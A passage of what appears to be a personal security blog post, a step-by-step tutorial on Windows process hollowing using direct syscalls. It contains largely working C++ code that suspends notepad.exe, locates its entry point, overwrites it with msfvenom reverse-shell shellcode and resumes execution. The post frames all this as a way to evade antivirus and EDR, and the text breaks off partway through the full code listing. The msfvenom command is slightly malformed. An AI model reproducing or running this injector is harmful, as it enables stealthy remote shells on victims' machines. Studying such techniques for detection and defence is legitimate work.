<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Process Hollowing with Direct Syscalls</title>
      <link href="/posts/process-hollowing-direct-syscalls/"/>
      <url>/posts/process-hollowing-direct-syscalls/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>This post is to help me understand the process hollowing technique and writing C++ code for it using direct syscalls.</p><h1 id="Theory"><a href="#Theory" class="headerlink" title="Theory"></a>Theory</h1><p>Process Hollowing is a technique often used by malware tool kits to hide malicious code within the presence of a seemingly legitimate process. The basic idea is to inject code into a suspended and hollowed-out process in an attempt to evade detection and defenses.</p><p>The basic theory is as follows:</p><ol><li>Create a process in a suspended state.</li><li>Locate the <em>EntryPoint</em> of the executable process.</li><li>Overwrite the memory region with our shellcode.</li><li>Continue execution.</li></ol><p>This way, our shell would be executed within a legitimate process like <code>notepad.exe</code> and would be less detectable to an unsuspecting target. </p><h1 id="Setting-up-Our-Environment"><a href="#Setting-up-Our-Environment" class="headerlink" title="Setting up Our Environment"></a>Setting up Our Environment</h1><p>Before jumping into the code, we need to set up our environment properly. This step is crucial in getting our direct syscalls to work since some of the APIs we’ll need later on, such as <code>NtQueryInformationProcess</code>, are not associated with a library and can only be accessed through run-time dynamic linking.</p><p>We’ll be using <code>Microsoft Visual Studio</code> for our project. Create a new empty <code>C++</code> console app. Here I’ll call the project “ProcessHollowing”. This should produce the following solution structure.<br><img src="/posts/process-hollowing-direct-syscalls/image-20240311143940736.png"></p><h2 id="MASM-Build-Customization"><a href="#MASM-Build-Customization" class="headerlink" title="MASM Build Customization"></a>MASM Build Customization</h2><p>From here, we need to set up build customizations for assembly files. Right-click on the project and go to <code>Build Dependencies -&gt; Build Customizations...</code><br><img src="/posts/process-hollowing-direct-syscalls/image-20240311144046575.png"></p><p>Make sure <code>masm</code> is checked and press Ok.<br><img src="/posts/process-hollowing-direct-syscalls/image-20240311144153381.png"></p><h2 id="Importing-SysWhispers2"><a href="#Importing-SysWhispers2" class="headerlink" title="Importing SysWhispers2"></a>Importing SysWhispers2</h2><p>The next step we need to do is download SysWhispers2. The project is intended for AV&#x2F;EDR evasion via direct system calls, but in this case we’ll just use some of the basic APIs it provides such as the aforementioned <code>NtQueryInformationProcess</code>.</p><p>Download the project and run the following command to generate the required files:</p><ul><li><a href="https://github.com/jthuraisamy/SysWhispers2">https://github.com/jthuraisamy/SysWhispers2</a></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python syswhispers.py --preset common -o syscalls_common</span><br></pre></td></tr></table></figure><p><img src="/posts/process-hollowing-direct-syscalls/image-20240311144710391.png"></p><p>Take note of the <code>syscalls_common.c</code>, <code>syscalls_common.h</code>, and <code>syscalls_common_stubs.std.x64.asm</code> files. Copy&#x2F;move them to the project folder.<br><img src="/posts/process-hollowing-direct-syscalls/image-20240311144800366.png"></p><p>From here, add the .h and .c&#x2F;.asm files to the project as header and source files, respectively. The resulting project structure should look like this:<br><img src="/posts/process-hollowing-direct-syscalls/image-20240311145057258.png"></p><p>Notice the <code>internals.h</code> file as well. This file includes definitions for some structures we’ll need. The contents of this file is:</p><ul><li><a href="https://github.com/m0n0ph1/Process-Hollowing/blob/master/sourcecode/ProcessHollowing/internals.h">https://github.com/m0n0ph1/Process-Hollowing/blob/master/sourcecode/ProcessHollowing/internals.h</a></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">PROCESS_BASIC_INFORMATION</span> &#123;</span><br><span class="line">PINT Reserved1;</span><br><span class="line">PINT PebBaseAddress;</span><br><span class="line">PINT Reserved2[<span class="number">2</span>];</span><br><span class="line">PINT UniqueProcessId;</span><br><span class="line">PINT Reserved3;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* _NtUnmapViewOfSection)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">PVOID BaseAddress</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* _NtQueryInformationProcess)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD ProcessInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">PVOID ProcessInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD ProcessInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">PDWORD ReturnLength</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* _NtQuerySystemInformation)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD SystemInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">PVOID SystemInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG SystemInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">PULONG ReturnLength</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="Include-ASM-File-to-Build"><a href="#Include-ASM-File-to-Build" class="headerlink" title="Include ASM File to Build"></a>Include ASM File to Build</h2><p>Our last step is to properly include the <code>.asm</code> file to our project. Right-click on the file and go to <code>Properties</code>. Make the following changes to our active configuration of <code>x64</code>:</p><ul><li>Excluded From Build - No</li><li>Content - Yes</li><li>Item Type - Microsoft Macro Assembler<br><img src="/posts/process-hollowing-direct-syscalls/image-20240311145356386.png"></li></ul><p>With that, we should be ready to start. Make sure to add the following include statements in <code>main.cpp</code> to use them:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;syscall_common.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;internals.h&quot;</span></span></span><br></pre></td></tr></table></figure><h1 id="Process-Hollowing"><a href="#Process-Hollowing" class="headerlink" title="Process Hollowing"></a>Process Hollowing</h1><h2 id="Create-Process-in-Suspended-State"><a href="#Create-Process-in-Suspended-State" class="headerlink" title="Create Process in Suspended State"></a>Create Process in Suspended State</h2><p>We begin by starting a simple <code>notepad.exe</code> process in a suspended state via the <code>CreateProcessA</code> API. From the Win32 API definition of <code>CreateProcessA</code>:</p><ul><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa">https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa</a></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreateProcessA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPCSTR                lpApplicationName,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out, optional] LPSTR                 lpCommandLine,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                BOOL                  bInheritHandles,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                DWORD                 dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPVOID                lpEnvironment,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPCSTR                lpCurrentDirectory,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                LPSTARTUPINFOA        lpStartupInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]               LPPROCESS_INFORMATION lpProcessInformation</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>There are several intricacies within the definition, but what we need to pay attention to is the <code>lpCommandLine</code> and <code>dwCreationFlags</code> parameters.</p><ul><li><code>lpCommandLine</code> - specifies the command we want to run (in this case, it’s <code>notepad.exe</code>)</li><li><code>dwCreationFlags</code> - specifies the priority class and the creation of the process (here, we want to use <code>CREATE_SUSPENDED</code>)</li></ul><p>We’ll also need to supply the <code>lpStartupInfo</code> and <code>lpProcessInformation</code> parameters, which can be done by instantiating <code>LPSTARTUPINFOA</code> and <code>LPPROCESS_INFORMATION</code> objects. </p><p>The following code will create a new <code>notepad.exe</code> in a suspended state:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// Create process to be hollowed out - notepad.exe</span></span><br><span class="line">LPSTARTUPINFOA si = <span class="keyword">new</span> <span class="built_in">STARTUPINFOA</span>(); <span class="comment">// pointer to a STARTUPINFO struct</span></span><br><span class="line">LPPROCESS_INFORMATION pi = <span class="keyword">new</span> <span class="built_in">PROCESS_INFORMATION</span>(); <span class="comment">// pointer to a PROCESS_INFORMATION struct</span></span><br><span class="line"><span class="built_in">CreateProcessA</span>(<span class="literal">NULL</span>, (LPSTR)<span class="string">&quot;notepad.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_SUSPENDED, <span class="literal">NULL</span>, <span class="literal">NULL</span>, si, pi);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>If we run this code and inspect the process in Process Hacker, we can see that the newly created <code>notepad.exe</code> process is in a suspended state (indicated by a gray background).<br><img src="/posts/process-hollowing-direct-syscalls/image-20240311135011203.png"></p><h2 id="Getting-EntryPoint-Address"><a href="#Getting-EntryPoint-Address" class="headerlink" title="Getting EntryPoint Address"></a>Getting EntryPoint Address</h2><h3 id="Manually-Getting-the-EntryPoint-in-WinDbg"><a href="#Manually-Getting-the-EntryPoint-in-WinDbg" class="headerlink" title="Manually Getting the EntryPoint in WinDbg"></a>Manually Getting the EntryPoint in WinDbg</h3><p>Now that we have the process in a suspended state, we need to find out its <em>EntryPoint</em> address. This is the starting address of the PE file and execution starts here. We can try to understand this manually first. </p><p>Attach the suspended <code>notepad.exe</code> process in <code>WinDbg</code> and get the location of the image base address from the Process Environment Block (PEB) - a data structure that contains data about a process. This is the base address at which the image of the process is loaded into memory. For us, the address is <code>00007ff676050000</code>.</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!peb</span><br></pre></td></tr></table></figure><p><img src="/posts/process-hollowing-direct-syscalls/image-20240311135550248.png"></p><p>We can also see that the base address is at an offset of <code>0x10</code> from the PEB</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dt _peb @$peb</span><br></pre></td></tr></table></figure><p><img src="/posts/process-hollowing-direct-syscalls/image-20240311135729779.png"></p><p>If we display more PE header information at that base address, we can see that the address of the entry point has a relative address of <code>23E50</code> from this base.</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!dh 0x00007ff6`76050000</span><br></pre></td></tr></table></figure><p><img src="/posts/process-hollowing-direct-syscalls/image-20240311135927188.png"></p><p>We can confirm by directly disassembling the entry point:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u $exentry</span><br></pre></td></tr></table></figure><p><img src="/posts/process-hollowing-direct-syscalls/image-20240311140039956.png"></p><p>We can see that:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00007ff6`76073e50 - 0x00007ff6`76050000 = 23E50</span><br></pre></td></tr></table></figure><p>Thus, we have found our entry point address at <code>00007ff676073e50</code>, with a relative address of <code>23E50</code> from the base image. Now, let’s see if we can mathematically calculate this address in code. </p><h3 id="Getting-the-EntryPoint-with-Code"><a href="#Getting-the-EntryPoint-with-Code" class="headerlink" title="Getting the EntryPoint with Code"></a>Getting the EntryPoint with Code</h3><p>Using our good friend Wikipedia, we can try to understand the PE file structure a little better</p><ul><li><a href="https://en.wikipedia.org/wiki/Portable_Executable">https://en.wikipedia.org/wiki/Portable_Executable</a></li><li><a href="https://en.wikipedia.org/wiki/Portable_Executable#/media/File:Portable_Executable_32_bit_Structure_in_SVG_fixed.svg">https://en.wikipedia.org/wiki/Portable_Executable#/media/File:Portable_Executable_32_bit_Structure_in_SVG_fixed.svg</a></li></ul><p>We can start by assuming we have the PEB address of the process. From this, we know that the base image address is at an offset of <code>0x10</code>. Reading the value at this offset, we get the base image address.</p><p>From here, we know that the pointer to the PE header is located at an offset of <code>0x3C</code> from the image base.<br><img src="/posts/process-hollowing-direct-syscalls/image-20240311141302666.png"></p><p>The entry point address is at an offset of <code>0x28</code> from the PE header.<br><img src="/posts/process-hollowing-direct-syscalls/image-20240311141350005.png"></p><p>Mathematically, the formula is:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;entry_point_addr&gt; = read(&lt;base_image_addr&gt; + 0x3C) + 0x28</span><br><span class="line">                   = read(read(&lt;PEB_addr&gt; + 0x10) + 0x3C) + 0x28</span><br></pre></td></tr></table></figure><p>With that, we need code that can help us:</p><ul><li>Locate the PEB of the process (<code>NtQueryInformationProcess</code>)</li><li>Read the memory from the remote process (<code>NtReadVirtualMemory</code>)</li></ul><p>To locate the image base of our <code>notepad.exe</code> process, we can add the following:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Get process ID</span></span><br><span class="line">DWORD pid = pi-&gt;dwProcessId;</span><br><span class="line">HANDLE hProcess = pi-&gt;hProcess;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Created notepad.exe process ID at: %d\r\n&quot;</span>, pid);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Calculate PEB and image base offset</span></span><br><span class="line">PROCESS_BASIC_INFORMATION* pbi = <span class="keyword">new</span> <span class="built_in">PROCESS_BASIC_INFORMATION</span>();</span><br><span class="line">ULONG retLen = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">NtQueryInformationProcess</span>(hProcess, ProcessBasicInformation, pbi, <span class="built_in">sizeof</span>(PROCESS_BASIC_INFORMATION), &amp;retLen);</span><br><span class="line">PINT ImageBaseOffset = (PINT)((INT64)pbi-&gt;PebBaseAddress + <span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Image Base Offset found at: %p\r\n&quot;</span>, ImageBaseOffset);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Read address of image base</span></span><br><span class="line">PINT lpImageBaseAddress = <span class="number">0</span>;</span><br><span class="line">SIZE_T bytesRead = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">NtReadVirtualMemory</span>(hProcess, ImageBaseOffset, &amp;lpImageBaseAddress, <span class="built_in">sizeof</span>(lpImageBaseAddress), &amp;bytesRead);</span><br><span class="line"><span class="comment">//printf(&quot;[+] Read %lld bytes\r\n&quot;, bytesRead);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Image Base Address found at: %p\r\n&quot;</span>, lpImageBaseAddress);</span><br></pre></td></tr></table></figure><p>Run this and we should be able to find the image base address.<br><img src="/posts/process-hollowing-direct-syscalls/image-20240311151420392.png"></p><p>Next, to read the entry point address:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Read 0x200 bytes from the base image to parse the PE header</span></span><br><span class="line">CHAR data[<span class="number">0x200</span>]; </span><br><span class="line">SIZE_T bytesRead1 = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">NtReadVirtualMemory</span>(hProcess, lpImageBaseAddress, &amp;data, <span class="built_in">sizeof</span>(data), &amp;bytesRead1);</span><br><span class="line"><span class="comment">//printf(&quot;[+] Read %lld bytes from base image\r\n&quot;, bytesRead1);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Extract the e_lfanew offset at 0x3C - this should hold the address value to the start of the PE header</span></span><br><span class="line"><span class="type">char</span> extractedBytes[<span class="number">4</span>];</span><br><span class="line"><span class="built_in">memcpy</span>(extractedBytes, data + <span class="number">0x3C</span>, <span class="number">4</span>);</span><br><span class="line"><span class="type">int</span> extractedInteger = *<span class="built_in">reinterpret_cast</span>&lt;<span class="type">int</span>*&gt;(extractedBytes);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] e_lfanew offset at: 0x%x\r\n&quot;</span>, extractedInteger);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Add 0x28 to get to the offset of the entrypoint RVA.</span></span><br><span class="line"><span class="type">int</span> opthdr = extractedInteger + <span class="number">0x28</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Entrypoint RVA offset found at: %x\r\n&quot;</span>, opthdr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Extract entrypoint RVA value</span></span><br><span class="line"><span class="type">char</span> entrypoint[<span class="number">4</span>];</span><br><span class="line"><span class="built_in">memcpy</span>(entrypoint, data + opthdr, <span class="number">4</span>);</span><br><span class="line"><span class="type">int</span> entrypoint_rva = *<span class="built_in">reinterpret_cast</span>&lt;<span class="type">int</span>*&gt;(entrypoint);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Entrypoint RVA value found at: %x\r\n&quot;</span>, entrypoint_rva);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get entrypoint address</span></span><br><span class="line">PINT addressOfEntryPoint = (PINT)(entrypoint_rva + (INT64)lpImageBaseAddress);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Entrypoint Address found at: %p\r\n&quot;</span>, addressOfEntryPoint);</span><br></pre></td></tr></table></figure><p><img src="/posts/process-hollowing-direct-syscalls/image-20240311151626097.png"></p><p>Now we’ve found the entry point address, we can attempt to “hollow” out the memory and overwrite it with our own shellcode.</p><h3 id="Overwriting-the-Memory"><a href="#Overwriting-the-Memory" class="headerlink" title="Overwriting the Memory"></a>Overwriting the Memory</h3><p>First, we generate shellcode for a reverse shell with <code>msfvenom</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=4444 -f c</span><br></pre></td></tr></table></figure><p><img src="/posts/process-hollowing-direct-syscalls/image-20240311152124992.png"></p><p>Then, we will use the following code to write it to memory and resume the thread:</p><ul><li><code>WriteProcessMemory</code> - to overwrite the entry point memory</li><li><code>ResumeThread</code> - to resume thread execution</li></ul><p><code>WriteProcessMemory</code>, which has the following definition:</p><ul><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory</a></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">WriteProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  HANDLE  hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPVOID  lpBaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPCVOID lpBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  SIZE_T  nSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out] SIZE_T  *lpNumberOfBytesWritten</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p><code>ResumeThread</code>, which has the following definition:</p><ul><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread">https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread</a></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">ResumeThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] HANDLE hThread</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>To execute the shellcode, use the following code:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// msfvenom -p windows/x64/shell_reverse_tcp LHOST=4444 -f c</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52&quot;</span></span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">SIZE_T nnRead = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, addressOfEntryPoint, buf, <span class="built_in">sizeof</span>(buf), &amp;nnRead);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Wrote %lld bytes to entry point\r\n&quot;</span>, nnRead);</span><br><span class="line"><span class="built_in">ResumeThread</span>(pi-&gt;hThread);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Thread resumed. Shellcode executed\r\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>With that, we should have a complete program. If we compile and run, we should see the <code>notepad.exe</code> process running our shellcode.<br><img src="/posts/process-hollowing-direct-syscalls/image-20240311154727245.png"></p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>In this post, we demonstrated the Process Hollowing technique which can be used to enhance our evasion capabilities. Our shellcode is easily signatured since it’s from <code>msfvenom</code>, but can be encrypted for further evasion.</p><h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><details><summary> Full Code </summary><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;syscall_common.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;internals.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// Create process to be hollowed out - notepad.exe</span></span><br><span class="line">LPSTARTUPINFOA si = <span class="keyword">new</span> <span class="built_in">STARTUPINFOA</span>(); <span class="comment">// pointer to a STARTUPINFO struct</span></span><br><span class="line">LPPROCESS_INFORMATION pi = <span class="keyword">new</span> <span class="built_in">PROCESS_INFORMATION</span>(); <span class="comment">// pointer to a PROCESS_INFORMATION struct</span></span><br><span class="line"><span class="built_in">CreateProcessA</span>(<span class="literal">NULL</span>, (LPSTR)<span class="string">&quot;notepad.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_SUSPENDED, <span class="literal">NULL</span>, <span class="literal">NULL</span>, si, pi);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get process ID</span></span><br><span class="line">DWORD pid = pi-&gt;dwProcessId;</span><br><span class="line">HANDLE hProcess = pi-&gt;hProcess;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Created notepad.exe process ID at: %d\r\n&quot;</span>, pid);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Calculate PEB and image base offset</span></span><br><span class="line">PROCESS_BASIC_INFORMATION* pbi = <span class="keyword">new</span> <span class="built_in">PROCESS_BASIC_INFORMATION</span>();</span><br><span class="line">ULONG retLen = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">NtQueryInformationProcess</span>(hProcess, 